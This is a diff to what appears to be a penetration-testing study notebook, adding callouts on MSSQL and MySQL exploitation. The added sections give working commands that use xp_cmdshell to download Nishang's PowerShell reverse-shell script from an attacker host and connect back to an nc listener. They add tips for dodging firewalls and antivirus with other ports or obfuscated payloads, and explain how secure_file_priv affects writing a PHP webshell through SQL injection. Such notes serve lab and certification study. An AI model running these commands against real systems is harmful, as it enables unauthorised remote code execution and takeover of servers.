@@ -31,6 +31,30 @@ With this feature enabled, we can execute any Windows shell command through the 
 > ```
 > From here you can upgrade the SQL shell to a full reverse shell.
 
+> [!example] Upgrading xp_cmdshell to an interactive reverse shell
+> `xp_cmdshell` output is one command at a time with no interactivity — pull down and run a PowerShell reverse shell (e.g. Nishang's `Invoke-PowerShellTcp.ps1` or Powercat) instead:
+> ```sh
+> # 1. On Kali: host the script and start a listener (two terminals)
+> sudo python3 -m http.server 80
+> nc -lvnp 4444
+> ```
+> ```sql
+> -- 2. In the mssqlclient session: pull the script and invoke a reverse connection
+> EXECUTE xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<KALI_IP>/Invoke-PowerShellTcp.ps1'')"';
+> EXECUTE xp_cmdshell 'powershell -c "Invoke-PowerShellTcp -Reverse -IPAddress <KALI_IP> -Port 4444"';
+> ```
+> A `GET /Invoke-PowerShellTcp.ps1 200` on the HTTP server confirms the target fetched it; the shell then lands in your `nc` listener.
+
+> [!danger] Nothing connects back on the listener
+> - **Start the listener *before* triggering the `xp_cmdshell` payload** — a connection attempt with nothing listening fails silently and you won't get a retry.
+> - `OSError: [Errno 98] Address already in use` when starting `python3 -m http.server 80` or a stale `nc` on your chosen port → something (often a previous listener you forgot to close) already owns it:
+>   ```bash
+>   sudo lsof -i :80
+>   sudo kill <PID>
+>   ```
+>   Full details: [[⚠️ Common Errors & Troubleshooting]]
+> - Firewall/AV on the Windows target may block the outbound connection or flag the PowerShell script — try a different port (443, 53) or an encoded/obfuscated payload.
+
 
 ## EXECUTE xp_cmdshell 'whoami';
 
@@ -51,6 +75,16 @@ The PHP system function will parse any statement included in the cmd parameter c
 > ```
 > The resulting `webshell.php` runs whatever you pass in the `cmd` parameter, acting as a web-interactive command shell.
 
+
+> [!warning] INTO OUTFILE fails with "The MySQL server is running with the --secure-file-priv option"
+> `secure_file_priv` restricts where `SELECT ... INTO OUTFILE` can write. Check it first if you have any other query primitive (error-based, a separate admin login, etc.):
+> ```sql
+> SHOW VARIABLES LIKE 'secure_file_priv';
+> ```
+> - Empty string → no restriction, write anywhere the OS user can.
+> - A path (e.g. `/var/lib/mysql-files/`) → you can **only** write inside that directory, which is usually not web-served; you'd need a separate way to reach the file (LFI, another writable+served path).
+> - `NULL` → file write is fully disabled; `INTO OUTFILE` cannot be used at all, fall back to `xp_cmdshell`-style RCE if the target is actually MSSQL, or look for another injection point/service.
+> This is a global server setting you cannot change via the injection itself — it's set in `my.cnf` and requires a MySQL restart.
 
 > [!info] Ignore the mysqli_fetch_array error
 > Submitting the payload in the `search.php` Lookup field throws a `TypeError: mysqli_fetch_array(): Argument #1 ($result) must be of type ...`. This is only about the query's return type and does not prevent the webshell from being written to disk.
